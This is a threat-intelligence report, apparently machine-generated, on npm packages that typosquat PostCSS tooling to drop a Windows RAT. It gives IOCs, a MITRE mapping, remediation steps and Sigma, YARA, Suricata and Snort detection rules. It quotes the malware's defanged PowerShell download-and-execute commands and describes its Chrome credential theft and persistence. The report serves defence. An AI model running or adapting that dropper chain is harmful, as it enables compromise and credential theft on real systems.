<!-- revision: 2026-06-24T1 — SIGMA-5 generic dotfile selectors (.store/.host) removed, rule now fires only on IOC-specific winPatch.zip; YARA-2/YARA-3 wrong hash attribution (audiodriver.pyd hash) removed; YARA-3 operator-precedence bug fixed (filesize < 50KB guard now covers all condition branches); SNORT-1 switched http_header to http_host for precise Host header matching; SNORT-3 msg domain defanged per convention, TCP/53 variant note added. -->
# Technical Analysis Report: npm PostCSS Lookalike RAT (2026-06-24)

Prepared by: Actioner
Date: 2026-06-24

---

## Executive Summary

Three malicious npm packages — `postcss-minify-selector-parser`, `postcss-minify-selector`, and `aes-decode-runner-pro` — were published by the npm user `abdrizak` to typosquat the legitimate `postcss-selector-parser` library (127M+ weekly downloads). The packages embed a multi-stage dropper chain that ultimately deploys a Windows Remote Access Trojan (RAT) capable of credential theft, remote shell access, file exfiltration, and persistence. The attack was discovered and reported by JFrog Security Research.

Combined download counts were approximately 1,016 (615 + 256 + 145) before removal. The RAT targets Windows exclusively and uses a novel delivery chain: JavaScript dropper -> PowerShell downloader -> VBScript bootstrapper -> Python-based RAT with Nuitka-compiled modules. The C2 server operates at `95[.]216[.]92[.]207:8080` with payload staging hosted on `nvidiadriver[.]net`.

## Background

This attack represents a software supply chain compromise via the npm ecosystem. Unlike simple typosquatting (single-character substitutions), the malicious package names are semantically plausible lookalikes of legitimate PostCSS build tooling, making them harder to detect during casual dependency review. The attacker chose names that would appear natural in a PostCSS-focused `package.json` — a technique increasingly observed in ecosystem-level attacks.

The legitimate target, `postcss-selector-parser`, is a foundational CSS tooling library maintained by the PostCSS ecosystem with over 127 million weekly downloads, making it a high-value impersonation target.

## Technical Analysis of the Malicious Payload

### Stage 1: JavaScript Dropper (index.js / src/config/defaults.js)

The malicious package's `package.json` specifies `"main": "index.js"`, which imports `src/config/defaults.js` containing an AES-256-GCM encrypted blob. Upon `require()` / `import`, the dropper:

1. Decrypts the embedded payload using a hardcoded AES-256-GCM key
2. Writes a PowerShell script (`settings.ps1`) to disk
3. Executes it via: `powershell -NoProfile -ExecutionPolicy Bypass -File ../../settings.ps1`

### Stage 2: PowerShell Downloader (settings.ps1)

The PowerShell script downloads and extracts the next-stage payload:

```
curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver[.]net/verv1432/winpatch-xd7d.win
Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
wscript "$env:TEMP\winPatch\update.vbs"
```

Key observations:
- Uses `curl.exe` (the Windows-native binary) rather than `Invoke-WebRequest` to avoid PowerShell logging
- The `-k` flag disables TLS certificate verification
- Payload URL masquerades as an NVIDIA driver distribution site

### Stage 3: VBScript Bootstrap (update.vbs)

The extracted VBScript launches the Python-based RAT by invoking `chost.exe` (a renamed `python.exe` 3.10 launcher) with `loader.py` as the entry point.

### Stage 4: Python RAT (Nuitka-compiled .pyd modules)

The RAT consists of six compiled Python extension modules:

| Module | Function |
|--------|----------|
| `config.cp310-win_amd64.pyd` | Constants, C2 URL, registry key names |
| `api.cp310-win_amd64.pyd` | HTTP C2 packet exchange with RC4/ARC4 encryption and MD5 checksums |
| `audiodriver.cp310-win_amd64.pyd` | Main RAT orchestration loop |
| `command.cp310-win_amd64.pyd` | Host profiling, VM detection, file transfers, shell execution |
| `auto.cp310-win_amd64.pyd` | Chrome credential/extension theft, bypasses app-bound encryption |
| `util.cp310-win_amd64.pyd` | tar/gzip archive helper functions |

#### RAT Capabilities:
- **Remote shell execution** via the `command` module
- **File upload/download** tunneled through C2 protocol
- **Chrome credential theft** from the `Login Data` SQLite database using AES-GCM and ChaCha20-Poly1305 decryption to bypass app-bound encryption
- **Chrome extension data collection**
- **Host profiling and reconnaissance**
- **VM detection** checking for: vmware, virtualbox, kvm, qemu, hyper-v processes (`vmtoolsd`, `vboxtray`, `vboxservice`) and MAC address prefixes (`00:05:69`, `00:0c:29`, `00:50:56`, `08:00:27`, `00:15:5d`)
- **Persistence** via registry Run key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\csshost`
- **Single-instance enforcement** via `%TEMP%\.store` lock file
- **Victim UUID tracking** via `%TEMP%\.host`

#### C2 Protocol:
- Transport: HTTP to `95[.]216[.]92[.]207:8080`
- Encryption: RC4/ARC4-wrapped packets with MD5 checksum verification

## Indicators of Compromise (IOCs)

### Malicious npm Packages

| Package Name | Downloads | JFrog ID |
|---|---|---|
| `postcss-minify-selector-parser` | 615 | XRAY-1002983 |
| `postcss-minify-selector` | 256 | XRAY-1003986 |
| `aes-decode-runner-pro` | 145 | XRAY-989675 |

**npm publisher account:** `abdrizak`

### Network Indicators

| Type | Value | Context |
|---|---|---|
| IPv4 | `95[.]216[.]92[.]207` | C2 server (port 8080) |
| Domain | `nvidiadriver[.]net` | Payload staging domain |
| URL | `hxxp://nvidiadriver[.]net/verv1432/winpatch-xd7d[.]win` | ZIP payload download URL |

### File Hashes (SHA-256)

| Hash | File |
|---|---|
| `164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3` | audiodriver.cp310-win_amd64.pyd |
| `50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf` | api.cp310-win_amd64.pyd |
| `17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871` | auto.cp310-win_amd64.pyd |
| `c8075bbff748096e1c6a1ea0aa67bb6762fdd7551427a12425b35b94c1f1ecf2` | command.cp310-win_amd64.pyd |
| `f6669bd504ce6b0e303be7ee47f2ebbc062989c88c41f0a3f436044a24869798` | config.cp310-win_amd64.pyd |
| `282b9bc318ad1234cbd1b86424b784299b8be31545802a7c6b751166b814b990` | util.cp310-win_amd64.pyd |

### Host Artifacts

| Artifact | Path / Value |
|---|---|
| PowerShell dropper | `settings.ps1` (relative to package directory) |
| ZIP payload | `%TEMP%\winPatch.zip` |
| VBS bootstrapper | `%TEMP%\winPatch\update.vbs` |
| Renamed Python launcher | `chost.exe` |
| Python loader | `loader.py` |
| Instance lock file | `%TEMP%\.store` |
| Victim UUID file | `%TEMP%\.host` |
| Registry persistence | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\csshost` |
| Supporting DLLs | `python310.dll`, `python3.dll` |
| Compiled modules | `*.cp310-win_amd64.pyd` (6 files listed above) |

## MITRE ATT&CK Mapping

| Technique ID | Name | Context |
|---|---|---|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Typosquatting npm packages impersonating PostCSS tooling |
| T1059.001 | Command and Scripting Interpreter: PowerShell | `settings.ps1` dropper with `-NoProfile -ExecutionPolicy Bypass` |
| T1059.005 | Command and Scripting Interpreter: Visual Basic | `update.vbs` bootstrapper executed via `wscript.exe` |
| T1105 | Ingress Tool Transfer | Payload downloaded from `nvidiadriver[.]net` via `curl.exe` |
| T1036.005 | Masquerading: Match Legitimate Name or Location | `chost.exe` (renamed `python.exe`); `nvidiadriver[.]net` domain |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | `HKCU\...\Run\csshost` persistence |
| T1140 | Deobfuscate/Decode Files or Information | AES-256-GCM encrypted blob in `defaults.js` |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Chrome Login Data extraction with app-bound encryption bypass |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP-based C2 to `95[.]216[.]92[.]207:8080` |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | VM process and MAC address prefix detection |
| T1074.001 | Data Staged: Local Data Staging | Payload extraction to `%TEMP%\winPatch\` |

## Detection & Remediation

### Immediate Actions

1. **Audit npm dependencies**: Search `package.json` and `package-lock.json` files across all repositories for the three malicious package names
2. **Network blocking**: Block `nvidiadriver[.]net` and `95[.]216[.]92[.]207` at the firewall/proxy level
3. **Endpoint scan**: Search for `%TEMP%\winPatch\`, `chost.exe`, `%TEMP%\.store`, `%TEMP%\.host`, and the registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\csshost`
4. **Credential rotation**: If compromise is confirmed, rotate all credentials stored in Chrome on affected machines
5. **Chrome extension audit**: Review installed Chrome extensions on affected endpoints for unauthorized additions

### Recommended Log Sources

- Windows Process Creation (Sysmon Event ID 1 / Security 4688)
- Windows Registry modification (Sysmon Event ID 13)
- Windows File Creation (Sysmon Event ID 11)
- DNS query logs
- HTTP proxy / firewall logs
- npm audit / package-lock review in CI/CD pipelines

## Detection Rules

### Sigma Rules

All Sigma rules validated via `sigma convert --without-pipeline -t splunk` and `sigma convert --without-pipeline -t log_scale`. The `sigma check` command was unavailable due to network connectivity issues with the MITRE ATT&CK/D3FEND data sources in this environment.

---

#### SIGMA-1: PostCSS Lookalike RAT - PowerShell Dropper Execution

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** high (IOC-specific: matches exact C2 domain + payload path)

```yaml
title: PostCSS Lookalike RAT - PowerShell Dropper Execution
id: 8a3e7c12-4f9b-4d1a-b8e2-1c6d3a5f7e90
status: experimental
description: Detects the PowerShell dropper stage of the PostCSS lookalike npm supply chain RAT, which uses curl.exe to download a ZIP payload from nvidiadriver[.]net and extracts it to a temp directory.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1059.001
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection_curl:
        CommandLine|contains|all:
            - 'curl.exe'
            - 'nvidiadriver'
            - 'winpatch'
    selection_expand:
        CommandLine|contains|all:
            - 'Expand-Archive'
            - 'winPatch'
    condition: selection_curl or selection_expand
falsepositives:
    - Unlikely in production environments
level: high
```

---

#### SIGMA-2: PostCSS Lookalike RAT - Registry Persistence via csshost

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** high (IOC-specific: unique registry value name `csshost`)

```yaml
title: PostCSS Lookalike RAT - Registry Persistence via csshost
id: 2b4f8d16-7e3a-49c5-a1d0-9f8c2b5e4a73
status: experimental
description: Detects registry persistence mechanism used by the PostCSS lookalike npm RAT, which creates a Run key named csshost pointing to a renamed Python launcher (chost.exe).
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1547.001
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|endswith: '\CurrentVersion\Run\csshost'
    condition: selection
falsepositives:
    - Unknown
level: high
```

---

#### SIGMA-3: PostCSS Lookalike RAT - VBScript Bootstrap from Temp Directory

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** high (IOC-specific: exact file path and name match)

```yaml
title: PostCSS Lookalike RAT - VBScript Bootstrap from Temp Directory
id: 5c7e1a39-8d4b-4f6c-b2e3-0a9d7c6f8b15
status: experimental
description: Detects wscript.exe executing update.vbs from the winPatch temp directory, indicative of the PostCSS lookalike npm RAT bootstrap stage.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1059.005
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wscript.exe'
        CommandLine|contains|all:
            - 'winPatch'
            - 'update.vbs'
    condition: selection
falsepositives:
    - Unlikely
level: high
```

---

#### SIGMA-4: PostCSS Lookalike RAT - Renamed Python Launcher (chost.exe)

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** high (IOC-specific: unique renamed binary + loader combination)

```yaml
title: PostCSS Lookalike RAT - Renamed Python Launcher (chost.exe)
id: 9d2f4b68-1c7e-4a3d-8f5b-6e0c9a7d2b41
status: experimental
description: Detects execution of chost.exe (renamed Python 3.10 launcher) loading loader.py, a behavioral indicator of the PostCSS lookalike npm RAT.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1036.005
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\chost.exe'
        CommandLine|contains: 'loader.py'
    condition: selection
falsepositives:
    - Unknown
level: high
```

---

#### SIGMA-5: PostCSS Lookalike RAT - Temp Directory File Artifacts

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** high (IOC-specific: unique zip payload filename)

```yaml
title: PostCSS Lookalike RAT - Temp Directory File Artifacts
id: 3e8a6d14-2b5c-4f7d-9a1e-0c4b8f6d3a72
status: experimental
description: Detects creation of the winPatch.zip payload in the temp directory, a characteristic artifact of the PostCSS lookalike npm RAT delivery chain.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1074.001
logsource:
    category: file_event
    product: windows
detection:
    selection_zip:
        TargetFilename|endswith: '\winPatch.zip'
    condition: selection_zip
falsepositives:
    - Legitimate software using winPatch.zip as a filename (unlikely)
level: high
```

> **Revision note:** The original rule included `.store` and `.host` dotfile selectors which are too generic for standalone detection (many applications create dotfiles in Temp). These selectors were removed. The dotfile artifacts (`%TEMP%\.store`, `%TEMP%\.host`) remain documented in the IOC table above for use in SIEM temporal-correlation rules pairing dotfile creation with other PostCSS RAT indicators.

---

#### SIGMA-6: PostCSS Lookalike RAT - Node.js to PowerShell Execution Chain

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** medium (TTP-based: node.exe -> PowerShell pattern is not unique to this threat)

```yaml
title: PostCSS Lookalike RAT - Node.js to PowerShell Execution Chain
id: 7f1b9c45-3d6e-4a8b-c2f0-5e7a1d4b8c36
status: experimental
description: Detects node.exe spawning PowerShell with NoProfile and ExecutionPolicy Bypass flags executing settings.ps1, matching the PostCSS lookalike npm RAT initial dropper chain.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
    - https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html
author: Actioner
date: 2026/06/24
tags:
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\node.exe'
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains|all:
            - '-NoProfile'
            - '-ExecutionPolicy'
            - 'Bypass'
            - 'settings.ps1'
    condition: selection
falsepositives:
    - Legitimate Node.js build scripts that invoke PowerShell with settings.ps1
level: medium
```

---

#### SIGMA-7: PostCSS Lookalike RAT - VM Detection Process Checks

**Compile status:** ✅ (splunk + log_scale convert successful)
**Confidence:** medium (TTP-based: VM detection checks are common across multiple malware families)

```yaml
title: PostCSS Lookalike RAT - VM Detection Process Checks
id: 4a2c8e57-6b1d-4f9a-d3e5-8c0f7b2a9d64
status: experimental
description: Detects process creation patterns consistent with the PostCSS lookalike npm RAT performing VM environment detection by checking for virtualization-related processes.
references:
    - https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/
author: Actioner
date: 2026/06/24
tags:
    - attack.t1497.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\chost.exe'
    selection_target:
        CommandLine|contains:
            - 'vmtoolsd'
            - 'vboxtray'
            - 'vboxservice'
    condition: selection_parent and selection_target
falsepositives:
    - System administration scripts checking VM status from Python-based tools
level: medium
```

---

### YARA Rules

YARA rules compiled successfully via `yarac` (exit code 0, no warnings).

---

#### YARA-1: PostCSS_Lookalike_RAT_PYD_Modules

**Compile status:** ✅ (yarac compiled successfully)
**Confidence:** high (hash-anchored + unique string combinations)

```yara
rule PostCSS_Lookalike_RAT_PYD_Modules
{
    meta:
        description = "Detects compiled Python modules (.pyd) associated with the PostCSS lookalike npm supply chain RAT"
        author = "Actioner"
        date = "2026-06-24"
        reference = "https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/"
        hash = "164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3"
        hash = "50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf"
        hash = "17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871"
        hash = "c8075bbff748096e1c6a1ea0aa67bb6762fdd7551427a12425b35b94c1f1ecf2"
        hash = "f6669bd504ce6b0e303be7ee47f2ebbc062989c88c41f0a3f436044a24869798"
        hash = "282b9bc318ad1234cbd1b86424b784299b8be31545802a7c6b751166b814b990"

    strings:
        $pyd_audiodriver = "audiodriver.cp310-win_amd64" ascii wide
        $pyd_api = "api.cp310-win_amd64" ascii wide
        $pyd_auto = "auto.cp310-win_amd64" ascii wide
        $pyd_command = "command.cp310-win_amd64" ascii wide
        $pyd_config = "config.cp310-win_amd64" ascii wide
        $pyd_util = "util.cp310-win_amd64" ascii wide
        $loader = "loader.py" ascii wide
        $chost = "chost.exe" ascii wide
        $c2_ip = "95.216.92.207" ascii wide
        $c2_domain = "nvidiadriver.net" ascii wide
        $reg_key = "csshost" ascii wide

    condition:
        uint16(0) == 0x5A4D and
        (
            any of ($pyd_*) and ($c2_ip or $c2_domain) or
            3 of ($pyd_*) or
            ($chost and $loader and $reg_key)
        )
}
```

---

#### YARA-2: PostCSS_Lookalike_RAT_JS_Dropper

**Compile status:** ✅ (yarac compiled successfully)
**Confidence:** high (unique combination of dropper-specific strings)

```yara
rule PostCSS_Lookalike_RAT_JS_Dropper
{
    meta:
        description = "Detects the JavaScript dropper embedded in malicious PostCSS npm packages"
        author = "Actioner"
        date = "2026-06-24"
        reference = "https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/"
        // hash omitted — no confirmed SHA-256 for the JS dropper file itself

    strings:
        $settings_ps1 = "settings.ps1" ascii
        $aes_gcm = "aes-256-gcm" ascii nocase
        $nvidiadriver = "nvidiadriver" ascii nocase
        $winpatch = "winpatch" ascii nocase
        $winPatch_zip = "winPatch.zip" ascii
        $curl_download = "curl.exe" ascii
        $expand_archive = "Expand-Archive" ascii

    condition:
        filesize < 500KB and
        (
            ($settings_ps1 and $aes_gcm) or
            ($nvidiadriver and $winpatch) or
            ($curl_download and $winPatch_zip and $expand_archive)
        )
}
```

---

#### YARA-3: PostCSS_Lookalike_RAT_VBS_Bootstrap

**Compile status:** ✅ (yarac compiled successfully)
**Confidence:** high (unique combination of VBS + renamed binary indicators)

```yara
rule PostCSS_Lookalike_RAT_VBS_Bootstrap
{
    meta:
        description = "Detects the VBScript bootstrapper (update.vbs) used by the PostCSS lookalike npm RAT"
        author = "Actioner"
        date = "2026-06-24"
        reference = "https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/"
        // hash omitted — no confirmed SHA-256 for update.vbs itself

    strings:
        $chost = "chost.exe" ascii wide nocase
        $loader = "loader.py" ascii wide nocase
        $wscript_shell = "WScript.Shell" ascii nocase
        $winpatch = "winPatch" ascii

    condition:
        filesize < 50KB and
        (
            ($chost and $loader) or
            ($wscript_shell and $winpatch and ($chost or $loader))
        )
}
```

---

### Suricata Rules

Validated via `suricata -T -S <file> -l /tmp/actioner` — configuration loaded successfully (exit code 0).

---

#### SURICATA-1: Payload Download from nvidiadriver[.]net

**Compile status:** ✅ (suricata -T passed)
**Confidence:** high (IOC-specific: exact domain + URI path)

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ACTIONER PostCSS Lookalike RAT - Payload Download from nvidiadriver[.]net"; flow:established,to_server; http.host; content:"nvidiadriver.net"; http.uri; content:"/verv1432/"; content:"winpatch"; sid:2200001; rev:1; metadata: author Actioner, created_at 2026_06_24, attack_id T1105; classtype:trojan-activity; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
```

---

#### SURICATA-2: C2 Communication to Known IP

**Compile status:** ✅ (suricata -T passed)
**Confidence:** high (IOC-specific: exact IP + port)

```
alert tcp $HOME_NET any -> 95.216.92.207 8080 (msg:"ACTIONER PostCSS Lookalike RAT - C2 Communication to Known IP"; flow:established,to_server; sid:2200002; rev:1; metadata: author Actioner, created_at 2026_06_24, attack_id T1071.001; classtype:trojan-activity; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
```

---

#### SURICATA-3: DNS Lookup for nvidiadriver[.]net

**Compile status:** ✅ (suricata -T passed)
**Confidence:** high (IOC-specific: exact malicious domain)

```
alert dns $HOME_NET any -> any 53 (msg:"ACTIONER PostCSS Lookalike RAT - DNS Lookup for nvidiadriver[.]net"; dns.query; content:"nvidiadriver.net"; nocase; sid:2200003; rev:1; metadata: author Actioner, created_at 2026_06_24, attack_id T1071.001; classtype:trojan-activity; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
```

---

### Snort Rules

Structural check only — ⚠️ uncompiled (no Snort binary available for validation).

---

#### SNORT-1: Payload Download from nvidiadriver[.]net

**Compile status:** ⚠️ uncompiled
**Confidence:** high (IOC-specific)

```
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ACTIONER PostCSS Lookalike RAT - Payload Download from nvidiadriver.net"; flow:established,to_server; content:"nvidiadriver.net"; http_host; content:"/verv1432/"; http_uri; content:"winpatch"; http_uri; classtype:trojan-activity; sid:2100001; rev:1; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
```

---

#### SNORT-2: C2 Beacon to Known IP

**Compile status:** ⚠️ uncompiled
**Confidence:** high (IOC-specific)

```
alert tcp $HOME_NET any -> 95.216.92.207 8080 (msg:"ACTIONER PostCSS Lookalike RAT - C2 Beacon to Known IP"; flow:established,to_server; classtype:trojan-activity; sid:2100002; rev:1; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
```

---

#### SNORT-3: DNS Query for nvidiadriver[.]net

**Compile status:** ⚠️ uncompiled
**Confidence:** high (IOC-specific)

```
alert udp $HOME_NET any -> any 53 (msg:"ACTIONER PostCSS Lookalike RAT - DNS Query for nvidiadriver[.]net"; content:"|0d|nvidiadriver|03|net|00|"; nocase; classtype:trojan-activity; sid:2100003; rev:1; reference:url,research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/;)
# NOTE: For TCP/53 DNS traffic, duplicate this rule with "alert tcp" and the same options.
```

---

## Sources

- JFrog Security Research: [From PostCSS Masquerading to Windows RAT](https://research.jfrog.com/post/from-postcss-typosquat-to-windows-rat/)
- The Hacker News: [Malicious npm Packages Pose as PostCSS Tools to Deliver Windows RAT](https://thehackernews.com/2026/06/malicious-npm-packages-pose-as-postcss.html)
- Infosecurity Magazine: [Lookalike npm Package Hides a Multi-Stage Windows RAT](https://www.infosecurity-magazine.com/news/lookalike-npm-package-postcss/)
- GBHackers: [Malicious npm Package Masquerades as PostCSS Utility to Deliver PowerShell Downloader](https://gbhackers.com/npm-package-masquerades-as-postcss/)

---

*Report generated by Actioner*
